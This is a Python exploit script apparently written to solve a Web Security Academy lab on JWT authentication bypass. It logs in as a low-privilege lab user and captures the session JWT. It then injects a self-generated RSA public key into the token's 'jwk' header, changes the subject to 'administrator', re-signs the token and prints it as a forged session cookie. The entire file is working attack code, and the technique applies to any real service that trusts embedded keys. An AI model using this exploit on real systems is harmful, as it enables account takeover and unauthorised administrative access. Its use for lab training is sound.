import base64
import http.client
import json
import re
import ssl
import urllib.parse
import uuid

import jwt as pyjwt
from cryptography.hazmat.primitives.asymmetric import rsa

LAB_ID = '???'


def GET_login() -> http.client.HTTPResponse:
    method, path = 'GET', '/login'
    host, port = f'{LAB_ID}.web-security-academy.net', 443
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.5',
        'referer': f'https://{LAB_ID}.web-security-academy.net/',
        'upgrade-insecure-requests': '1',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'te': 'trailers',
    }
    connection = http.client.HTTPSConnection('localhost', 27001, context=ssl._create_unverified_context())
    connection.set_tunnel(host, port)
    connection.request(method, path, ''.encode('utf-8'), headers)
    return connection.getresponse()


def POST_login(
        csrf: str,
) -> http.client.HTTPResponse:
    method, path = 'POST', '/login'
    host, port = f'{LAB_ID}.web-security-academy.net', 443
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.5',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': f'https://{LAB_ID}.web-security-academy.net',
        'referer': f'https://{LAB_ID}.web-security-academy.net/login',
        'upgrade-insecure-requests': '1',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'te': 'trailers',
    }
    fields = {
        'csrf': csrf,
        'username': 'wiener',
        'password': 'peter',
    }
    body = urllib.parse.urlencode(fields)
    headers['Content-Length'] = str(len(body))
    connection = http.client.HTTPSConnection('localhost', 27001, context=ssl._create_unverified_context())
    connection.set_tunnel(host, port)
    connection.request(method, path, body, headers)
    return connection.getresponse()


def login_csrf() -> str:
    response = GET_login()
    csrf = re.findall(r'name="csrf" value="([a-zA-Z0-9]+)"', response.read().decode('utf-8'))[0]
    return csrf


def login_session() -> str:
    csrf = login_csrf()
    response = POST_login(csrf)
    cookie_header = response.getheader('set-cookie')
    return re.findall(r'session=([a-zA-Z0-9._-]+);', cookie_header)[0]


jwt = login_session()

private_key = rsa.generate_private_key(
    public_exponent=65537,
    key_size=512,
)

jwt_header = json.loads(base64.b64decode(jwt.split('.')[0] + '=='))
kid = str(uuid.uuid4())
jwt_header["kid"] = kid

exponent = private_key.public_key().public_numbers().e
exponent = exponent.to_bytes(
    length=(exponent.bit_length() + 7) // 8,
    byteorder="big",
)
exponent = base64.urlsafe_b64encode(exponent).decode().rstrip('=')

modulus = private_key.public_key().public_numbers().n
modulus = modulus.to_bytes(
    length=(modulus.bit_length() + 7) // 8,
    byteorder="big",
)
modulus = base64.urlsafe_b64encode(modulus).decode().rstrip('=')

jwt_header["jwk"] = {
    "kty": "RSA",
    "kid": kid,
    "n": modulus,
    "e": exponent,
}
jwt_payload = json.loads(base64.b64decode(jwt.split('.')[1] + '=='))
jwt_payload['sub'] = 'administrator'
hacked_jwt = pyjwt.encode(
    jwt_payload,
    private_key,
    headers=jwt_header,
)
print("session cookie to copy:")
print(hacked_jwt)
